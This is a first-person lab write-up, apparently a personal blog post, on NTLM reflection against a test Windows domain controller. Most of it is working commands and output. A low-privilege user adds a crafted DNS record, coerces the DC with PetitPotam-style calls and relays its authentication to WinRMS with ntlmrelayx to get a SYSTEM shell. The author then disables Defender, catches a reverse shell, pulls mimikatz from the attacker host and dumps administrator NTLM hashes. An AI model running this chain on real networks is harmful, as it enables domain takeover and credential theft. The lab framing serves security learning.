## Ntlm Relay on its own machine

Lets exploit one new ways of doing NTLM relaying : NTLM reflection. 

Unlike classic NTLM relay attacks, NTLM reflection allows you to relay the hash **back to the same machine it originated from**.  

## Initial Setup

Lets just say that I managed to get cred for an user like john, he doesnt have any privilege but **can add DNS records**. This could allow us to privesc to NT system and DC admins.



So I have creds working for john:

```bash
nxc smb 192.168.10.10 -u 'john' -p 'marioKart1'                   
SMB         192.168.10.10   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:lab.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                               
SMB         192.168.10.10   445    DC1              [+] lab.local\john:marioKart1 

```

Lets check if the dc is vulnerable to the attacks using the netexec module ntlm_reflection:


```bash

nxc smb 192.168.10.10 -u 'john' -p 'marioKart1' -M ntlm_reflection                      
SMB         192.168.10.10   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:lab.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.10.10   445    DC1              [+] lab.local\john:marioKart1 
NTLM_REF... 192.168.10.10   445    DC1              VULNERABLE (can relay SMB to other protocols except SMB on 192.168.10.10) 
```


I can relay creds to others protocols except SMB since signing is enabled and required.

## Adding a DNS Record

Before coercing the DC to authenticate, we need to add a DNS record pointing to our IP (192.168.10.11). Without this step, the DC might reject the connection due to **name verification or service binding**, and techniques like PetitPotam would fail.


```bash
python3 dnstool.py -u LAB\\john -p 'marioKart1' --action add --record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.lab.local --data 192.168.10.11 --type A 192.168.10.10

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```
For more details on this weird DNS record and why it’s needed, check this blog post:
[text](https://www.synacktiv.com/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025)

## Coercing the DC

Now we can **force the DC to authenticate to us** using PetitPotam and relay its creds. Here, I used the netexec coerce_plus module:

```bash
nxc smb 192.168.10.10 -u 'john' -p 'marioKart1' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

The DC has WinRM over HTTPS enabled (port 5986). To relay to it I setup a listener using impacket-ntlmrelayx


![The command for relay](relay.png)

```bash
python3 examples/ntlmrelayx.py -t winrms://192.168.10.10 -smb2support --remove-mic -debug
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/tools/impacket/myvenv/lib/python3.13/site-packages/impacket
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack WINRMS loaded..
[+] Protocol Attack MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 192.168.10.10, attacking target winrms://192.168.10.10
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@192.168.10.10 against winrms://192.168.10.10 SUCCEED [1]
[*] winrms:///@192.168.10.10 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000

```
I can then connect to the interactive shell and grabs the funny flag that I made.

```bash
nc 127.0.0.1 11000
Type help for list of commands

# cmd
Microsoft Windows [version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. Tous droits rservs.

C:\Windows\system32\config\systemprofile>

# type C:\Users\Administrateur\Desktop\flag.txt
Winrms not really that secured !!

# 
```
## Reverse Shell & Hash Dump

I can then do anything I want on the box like dumping hashes.

I  disable Windows Defender to avoid AMSI blocking my command:

```powershell
powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true 
```


Now I can get a better and more usable revshell, I just grab the Powershell#3 (base64) from revshell.com then dump the hash using mimikatz

![Dumping hashes](mimikatz.png)

```powershell
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.10.11] from (UNKNOWN) [192.168.10.10] 58004
whoami
autorite nt\syst?me
PS C:\Windows\system32\config\systemprofile> cd C:\Temp
PS C:\Temp> IWR http://192.168.10.11:8000/x64/mimikatz.exe -o mimikatz.exe
PS C:\Temp> .\mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 411785 (00000000:00064889)
Session           : Interactive from 1
User Name         : Administrateur
Domain            : LAB
Logon Server      : DC1
Logon Time        : 17/11/2025 18:33:42
SID               : S-1-5-21-1336586935-998966762-933632514-500
        msv :
         [00000003] Primary
         * Username : Administrateur
         * Domain   : LAB
         * NTLM     : 602f5c34346bc946f9ac2c0922cd9ef6
         * SHA1     : 1b4c7a2c1b58e59d184291da8436b4c9f3b26c50
         * DPAPI    : 7ff98b174e5cbfb4b140a9de5c65d1e6
        tspkg :
        wdigest :
         * Username : Administrateur
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : Administrateur
         * Domain   : LAB.LOCAL
         * Password : (null)
        ssp :
        credman :
```

**Thx for reading my first post !!**